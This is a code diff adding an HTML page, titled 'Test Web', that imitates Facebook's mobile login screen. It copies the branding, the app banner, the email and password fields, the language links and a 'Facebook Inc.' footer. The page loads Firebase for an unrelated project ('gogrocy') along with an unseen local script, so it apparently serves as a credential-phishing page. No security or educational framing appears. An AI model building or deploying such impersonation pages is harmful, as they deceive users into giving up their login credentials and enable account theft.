@@ -1,0 +1,211 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width minimum-scale=1.0 maximum-scale=1.0 user-scalable=no">
+
+    <title>Test Web</title>
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-beta.3/css/bootstrap.min.css" />
+
+    <!-- The core Firebase JS SDK is always required and must be listed first -->
+    <script src="https://www.gstatic.com/firebasejs/7.14.4/firebase-app.js"></script>
+
+    <!-- TODO: Add SDKs for Firebase products that you want to use
+     https://firebase.google.com/docs/web/setup#available-libraries -->
+    <script src="https://www.gstatic.com/firebasejs/7.14.4/firebase-analytics.js"></script>
+    <style>
+        nav {
+            background: #3b5998;
+            text-align: center;
+            height: 44px;
+        }
+
+        nav .navbar_brand {
+            color: white;
+            font-weight: 610;
+            font-size: 25px;
+
+        }
+
+        .app_link {
+            background: #fffbe2;
+            overflow: hidden;
+            display: flex;
+            height: 48px;
+            font-size: 14px;
+        }
+
+        .link_text {
+            align-self: center;
+            padding-left: 10px;
+        }
+
+        .link_text a {
+            text-decoration: none;
+        }
+
+        .img {
+            padding-top: 5px;
+            padding-bottom: 5px;
+        }
+
+        form button {
+            background: #1877f2;
+            width: 100%;
+            display: block;
+            border: 0;
+            border-radius: 5px;
+            padding: 5px;
+            font-weight: bold;
+            color: white;
+            font-size: 14px;
+        }
+
+        form input {
+            height: 41.6px;
+            border: 0px;
+            margin-bottom: 3px;
+        }
+
+        input[name='email'] {
+            border-radius: 5px 5px 0 0;
+        }
+
+        input[name='pass'] {
+            border-radius: 0 0 5px 5px;
+        }
+
+        #acc_btn {
+            background-color: #00a400;
+            margin: 10px 0;
+            color: #fff;
+            font-size: 14px;
+            font-weight: bold;
+        }
+
+        a {
+            color: #7596c8;
+        }
+        .lang_select{
+            font-size: 12px;
+        }
+        .plus{
+            position: relative;
+            background: white;
+            border: 1px solid #7596c8;
+            width:20px!important;
+            height: 20px;
+            border-radius: 2px;
+            box-sizing: border-box;
+        }
+        .plus::before{
+            content: "+";
+            position: absolute;
+            top:50%;
+            left:50%;
+            color: #7596c8;
+            transform: translate(-50%,-58%);
+            font-size: 20px;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="wrapper">
+        <nav class="py-1">
+            <a class="navbar_brand" href="#">facebook</a>
+        </nav>
+        <div class="app_link container-fluid">
+            <div class="img"><img src="https://m.facebook.com/rsrc.php/v3/y3/r/cvj8rfO8RgU.png" alt="icon"
+                    height="90px"></div>
+            <div class="link_text"><a
+                    href="https://m.facebook.com/click.php?redir_url=market%3A%2F%2Fdetails%3Fid%3Dcom.facebook.katana%26referrer%3Dutm_reg%253DVJB7XsLklBHl91B26C_2NmFN%26referrer_params%255Blink_source%255D%3Dfb_app_banner&amp;app_id=350685531728&amp;cref=mb&amp;no_fw=1&amp;refid=8"
+                    target="_blank">Get Facebook for Android and browse faster.</a></div>
+        </div>
+        <section class="form_section container mt-3">
+            <form action="">
+                <input class="form-control" autocorrect="off" autocapitalize="off" type="email"
+                    class="_56bg _4u9z _5ruq _8qtn" autocomplete="on" id="m_login_email" name="email"
+                    placeholder="Mobile number or email address">
+                <input autocorrect="off" autocapitalize="off" class="form-control" autocomplete="on"
+                    id="m_login_password" name="pass" placeholder="Password" type="password">
+                <button type="submit" class="my-2 py-2">Log In</button>
+            </form>
+            <div id="seperator" class="text-center py-2" style="font-size:12px;">or</div>
+            <div class="sign_up_btn text-center">
+                <button class='btn' id='acc_btn'>Create New Account</button>
+            </div>
+            <div class="text-center" style="font-size: 14px;"><a tabindex="0"
+                    href="/recover/initiate/?c=https%3A%2F%2Fm.facebook.com%2F%3Frefsrc%3Dhttps%253A%252F%252Fwww.facebook.com%252F&amp;r&amp;cuid&amp;ars=facebook_login&amp;lwv=100&amp;refid=8"
+                    id="forgot-password-link">Forgotten password?</a></div>
+        </section>
+        <section class="lang_select">
+            <div class="container mt-5">
+                <div class="row text-center">
+                    <div class="col-6"><span class="_52jc _52j9 _52jh _3ztb">English (UK)</span>
+                        <div class="_3ztc"><span class="_52jc"><a
+                                    href="/a/language.php?l=ur_PK&amp;lref=https%3A%2F%2Fm.facebook.com%2F%3Frefsrc%3Dhttps%253A%252F%252Fwww.facebook.com%252F&amp;sref=legacy_mobile_settings_selector&amp;gfid=AQDUkKfLDMC-t9AJ&amp;refid=8"
+                                    data-locale="ur_PK" data-sigil="change_language">اردو</a></span></div>
+                        <div class="_3ztc"><span class="_52jc"><a
+                                    href="/a/language.php?l=ml_IN&amp;lref=https%3A%2F%2Fm.facebook.com%2F%3Frefsrc%3Dhttps%253A%252F%252Fwww.facebook.com%252F&amp;sref=legacy_mobile_settings_selector&amp;gfid=AQBFYo6YIcLu98Sx&amp;refid=8"
+                                    data-locale="ml_IN" data-sigil="change_language">മലയാളം</a></span></div>
+                        <div class="_3ztc"><span class="_52jc"><a
+                                    href="/a/language.php?l=ta_IN&amp;lref=https%3A%2F%2Fm.facebook.com%2F%3Frefsrc%3Dhttps%253A%252F%252Fwww.facebook.com%252F&amp;sref=legacy_mobile_settings_selector&amp;gfid=AQDM1XiBpwewB84K&amp;refid=8"
+                                    data-locale="ta_IN" data-sigil="change_language">தமிழ்</a></span></div>
+                    </div>
+                    <div class="col-6">
+                        <div class="_3ztc"><span class="_52jc"><a
+                                    href="/a/language.php?l=hi_IN&amp;lref=https%3A%2F%2Fm.facebook.com%2F%3Frefsrc%3Dhttps%253A%252F%252Fwww.facebook.com%252F&amp;sref=legacy_mobile_settings_selector&amp;gfid=AQA7NZX5rMzBgDGI&amp;refid=8"
+                                    data-locale="hi_IN" data-sigil="change_language">हिन्दी</a></span></div>
+                        <div class="_3ztc"><span class="_52jc"><a
+                                    href="/a/language.php?l=kn_IN&amp;lref=https%3A%2F%2Fm.facebook.com%2F%3Frefsrc%3Dhttps%253A%252F%252Fwww.facebook.com%252F&amp;sref=legacy_mobile_settings_selector&amp;gfid=AQApgNM1bcb79_Hz&amp;refid=8"
+                                    data-locale="kn_IN" data-sigil="change_language">ಕನ್ನಡ</a></span></div>
+                        <div class="_3ztc"><span class="_52jc"><a
+                                    href="/a/language.php?l=te_IN&amp;lref=https%3A%2F%2Fm.facebook.com%2F%3Frefsrc%3Dhttps%253A%252F%252Fwww.facebook.com%252F&amp;sref=legacy_mobile_settings_selector&amp;gfid=AQA6iLY78RDQUoe_&amp;refid=8"
+                                    data-locale="te_IN" data-sigil="change_language">తెలుగు</a></span></div><a
+                            href="/language.php?n=https%3A%2F%2Fm.facebook.com%2F%3Frefsrc%3Dhttps%253A%252F%252Fwww.facebook.com%252F&amp;refid=8">
+                            <div class="_3j87 _1rrd _3ztd" aria-label="Complete list of languages"
+                                data-sigil="more_language"><button class="plus"></button></div>
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </section>
+        <footer class="text-center text-secondary" style="font-size: 12px;">Facebook Inc.</footer>
+    </div>
+    <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js"
+        integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n"
+        crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"
+        integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo"
+        crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-beta.3/js/bootstrap.min.js"></script>
+    <script src="js/vue.js"></script>
+
+
+    <script>
+        // Your web app's Firebase configuration
+        var firebaseConfig = {
+            apiKey: "AIzaSyCzUUcmKheV8qwfAzJvVNvmInpB6tQZcWE",
+            authDomain: "gogrocy-e1f9e.firebaseapp.com",
+            databaseURL: "https://gogrocy-e1f9e.firebaseio.com",
+            projectId: "gogrocy-e1f9e",
+            storageBucket: "gogrocy-e1f9e.appspot.com",
+            messagingSenderId: "976780130407",
+            appId: "1:976780130407:web:ae506d87013c68c347bcc2",
+            measurementId: "G-EVJ8F1MF48"
+        };
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        firebase.analytics();
+    </script>
+
+
+</body>
+
+</html>
